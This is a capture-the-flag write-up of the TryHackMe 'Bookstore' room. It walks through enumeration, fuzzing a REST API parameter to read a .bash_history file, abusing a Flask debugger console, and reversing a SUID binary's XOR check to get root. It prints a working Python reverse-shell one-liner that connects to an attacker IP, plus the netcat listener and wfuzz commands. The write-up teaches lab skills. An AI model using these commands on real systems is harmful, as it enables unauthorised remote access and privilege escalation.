<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>bookstore</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>bookstore</h1><br/><p><strong><h1>THM Bookstore</h1></strong></p><p></p><p><strong><h3>Enumeration:</h3></strong></p><p></p><p><strong><h5>Nmap</h5></strong></p><p><img src="images/67-1.png" alt="images/67-1.png" /></p><p></p><p>We see that SSH port is open &amp; Website port is open (80 &amp; 5000)</p><p>It seems that some API is running on the 5000 port by seeing the disallowed entry in the <strong>robots.txt</strong> file</p><p></p><p><strong><h5>Website Enumeration</h5></strong></p><p></p><p><img src="images/67-2.png" alt="images/67-2.png" /></p><p></p><p>Simple default home page. However, there is button on the top right of the page to navigate into a login endpoint.</p><p></p><p><img src="images/67-3.png" alt="images/67-3.png" /></p><p></p><p>Inthe login page we found an message in the server response stating that its a work in progress &amp; debugger&#39;s pin is in sid&#39;s bash_history&#39;s file.</p><p></p><p><img src="images/67-4.png" alt="images/67-4.png" /></p><p></p><p><img src="images/67-5.png" alt="images/67-5.png" /></p><p></p><p>Next, we enumerate the 5000 port to find another login endpoint.</p><p><img src="images/67-6.png" alt="images/67-6.png" /></p><p></p><p>we give a dummy username &amp; password to get the following,</p><p></p><p><img src="images/67-7.png" alt="images/67-7.png" /></p><p></p><p>This also uses GET method to send the credentials &amp; we also get the information about the <strong>Foxy REST API v2.0</strong></p><p>Upon visiting the disallowed /api path. We get the following API documentation which also talks about the various routes allowed in the api.</p><p></p><p><img src="images/67-8.png" alt="images/67-8.png" /></p><p></p><p>Example:</p><p><img src="images/67-9.png" alt="images/67-9.png" /></p><p></p><p><strong><h5>Web Directory Enumeration</h5></strong></p><p></p><p><strong>gobuster</strong></p><p><img src="images/67-10.png" alt="images/67-10.png" /></p><p></p><p>We go the /console location on 5000 port to get the following.</p><p></p><p><img src="images/67-11.png" alt="images/67-11.png" /></p><p></p><p></p><p></p><p>We tried to use the previous version <strong>v1</strong> as it sometimes remains unpatched &amp; with vulnerabilities. We try to check if any LFI exists. But we do not get any result. </p><p></p><p><img src="images/67-12.png" alt="images/67-12.png" /></p><p></p><p>Next, we try fuzzing the parameter using wfuzz as follows.</p><p></p><p><strong>wfuzz -u http://10.10.18.214:5000/api/v1/resources/books?FUZZ=.bash_history -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --hc 404</strong></p><p></p><p><img src="images/67-13.png" alt="images/67-13.png" /></p><p></p><p>We got a new parameter called <strong>show</strong></p><p>We used the parameter to look for .bash_history &amp; were successful.</p><p></p><p><img src="images/67-14.png" alt="images/67-14.png" /></p><p></p><p>we got the PIN. Lets enter it into the console endpoint.</p><p></p><p><img src="images/67-15.png" alt="images/67-15.png" /></p><p></p><p>we got a python interactive console. </p><p></p><p><strong><h2>Foothold</h2></strong></p><p></p><p>We use a python reverse shell taken from <strong>https://cybexray.github.io/revshell/revshell.html</strong></p><p>We started a listner in our local kali machine using <strong>rlwrap nc -lvnp 8888</strong></p><p></p><p></p><p><img src="images/67-16.png" alt="images/67-16.png" /></p><p></p><p><strong>import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;</strong><strong><small>10.17.5.85</small></strong><strong>&quot;,</strong><strong><small>8888</small></strong><strong>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;</strong><strong><small>sh</small></strong><strong>&quot;)</strong></p><p></p><p></p><p>We got connection in our listener.</p><p></p><p><img src="images/67-17.png" alt="images/67-17.png" /></p><p></p><p>we get into a bash shell &amp; get the user flag from sid&#39;s home directory.</p><p></p><p><img src="images/67-18.png" alt="images/67-18.png" /></p><p></p><p></p><p><strong><h2>Privilege Escalation</h2></strong></p><p></p><p></p><p>We look for sudo permissions for the user sid, but were prompted for password which we dont have.</p><p>Next, we searched for files using suid set &amp; found a file in sid&#39;s home directory.</p><p></p><p><img src="images/67-19.png" alt="images/67-19.png" /></p><p></p><p>Lets check the file type</p><p><img src="images/67-20.png" alt="images/67-20.png" /></p><p></p><p></p><p>It is a linux executible. Lets run it. </p><p>It asks for magic number &amp; then says incorrect.</p><p></p><p><img src="images/67-21.png" alt="images/67-21.png" /></p><p></p><p>We used strings command to check the executibel on the target machine itself &amp; found some intresting results.</p><p></p><p><img src="images/67-22.png" alt="images/67-22.png" /></p><p></p><p>We can see it checks for a magic number &amp; if its correct it should open a root /bin/bash -p shell for us. We need to find a way to get the magic number.</p><p>We start a web server using python on the target machine &amp; get the linux executible to examine it in my local kali machine.</p><p></p><p>We opened ghidra&#39;s code browser to analyze the executible.</p><p></p><p><img src="images/67-23.png" alt="images/67-23.png" /></p><p></p><p>we found the checking condition.</p><p></p><p><strong>local_14 = local_1c ^ 0x1116 ^ local_18;</strong></p><p></p><p>The above code snippet tells that the value of <strong>local_14</strong> will be cacluated by XOR operation of<strong> local_1c ^ 0x1116 ^ local_18</strong> </p><p>From the code we can get the following values:</p><p></p><p><strong>local_14=0x5dcd21f4</strong></p><p><strong>local_18=0x5db3</strong></p><p><strong>0x1116</strong></p><p></p><p>XOR operation is reversible. It means to get <strong>local_1c</strong> value which is our user input. We need to do the following.</p><p></p><p><strong>local_1c= local_14 ^ 0x1116 ^ local_18;</strong></p><p></p><p>We open a python interpreter and run the following. We got the magic number.</p><p></p><p><img src="images/67-24.png" alt="images/67-24.png" /></p><p></p><p>We run the program agin in the target machine. We entered the magic number found above &amp; got into root shell. Finally we get the root flag.</p><p></p><p><img src="images/67-25.png" alt="images/67-25.png" /></p><p></p><p></p><p>Thanks!!</p></div>
</body>
</html>
